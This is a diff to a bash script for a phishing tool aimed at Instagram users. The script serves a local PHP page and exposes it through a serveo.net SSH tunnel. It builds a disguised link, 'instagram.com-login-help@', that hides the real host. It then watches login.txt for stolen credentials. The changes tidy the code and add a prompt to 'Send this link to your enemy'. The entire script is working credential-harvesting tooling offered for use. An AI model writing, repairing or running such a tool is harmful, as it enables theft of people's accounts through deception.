@@ -12,7 +12,6 @@ if ! command -v lolcat > /dev/null 2>&1; then
     gem install lolcat
 fi
 
-
 # Colors
 RED='\033[1;31m'
 GRN='\033[1;32m'
@@ -78,25 +77,27 @@ start_localhost() {
 # Serveo option
 start_serveo() {
   echo -e "${GRN}[+] Starting PHP server...${NC}"
-php -S 127.0.0.1:8080 > /dev/null 2>&1 &
-sleep 1
+  php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+  sleep 1
 
-echo -e "${GRN}[+] Starting Serveo tunnel...${NC}"
-ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
-sleep 5
+  echo -e "${GRN}[+] Starting Serveo tunnel...${NC}"
+  ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
+  sleep 5
 
-SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*.serveo.net" serveo.log | head -n1)
+  SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*.serveo.net" serveo.log | head -n1)
 
-if [ ! -z "$SERVEO_URL" ]; then
-  MASKED_URL="https://instagram.com-login-help@${SERVEO_URL#https://}"
-  # echo -e "${GRN}[+] Serveo URL: $SERVEO_URL${NC}"  # Commented to hide raw URL
-  echo -e "${CYAN}[+] Masked URL: $MASKED_URL${NC}"
-  if [[ "$MASKED_URL" == *"serveo.net"* ]]; then
-  echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
-  tail -n 0 -f login.txt
-else
-  echo -e "${RED}[!] Failed to get Serveo URL. Check your connection.${NC}"
-fi
+  if [ ! -z "$SERVEO_URL" ]; then
+    MASKED_URL="https://instagram.com-login-help@${SERVEO_URL#https://}"
+    echo -e "${CYAN}[+] Masked URL: $MASKED_URL${NC}"
+    if [[ "$MASKED_URL" == *"serveo.net"* ]]; then
+      echo -e "${GRN}[€] Send this link to your enemy${NC}"
+      echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
+      tail -n 0 -f login.txt
+    fi
+  else
+    echo -e "${RED}[!] Failed to get Serveo URL. Check your connection.${NC}"
+  fi
+}
 
 # Main Menu
 echo -e "${CYAN}Choose Port Forwarding Method:${NC}"
@@ -106,7 +107,7 @@ read -p $'\n>> ' choice
 
 case $choice in
   1) start_localhost;;
-  2)start_serveo;;
+  2) start_serveo;;
   *)
     echo -e "${RED}[!] Invalid choice.${NC}"
     exit 1
